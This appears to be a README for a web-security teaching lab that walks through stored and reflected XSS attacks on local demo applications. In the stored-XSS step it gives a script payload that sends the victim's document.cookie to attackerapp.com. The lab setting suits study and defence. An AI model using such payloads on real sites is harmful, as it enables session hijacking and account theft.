# SecuringWebApplications
## 1. Persistent XSS Atack
Application: storedXssAttack1
a. Post a comment to the the url 

      URL:'http://localhost:8080/storedXssAttack1/Comment'

      Method : POST

      Request Body

          comment : <script>window.location='http://attackerapp.com/?cookie='+document.cookie</script>


b. Get the comment from the url
http://localhost:8080/storedXssAttack1/Comment

## 1. Non-Persistent XSS Attack
Applications: datingapp, myCommerce

a. Open the url 'http://localhost:8080/datingapp/' and submit the registration form, you can observe that the cookies of myCommerce application are shared with attackerapp.com.
`     
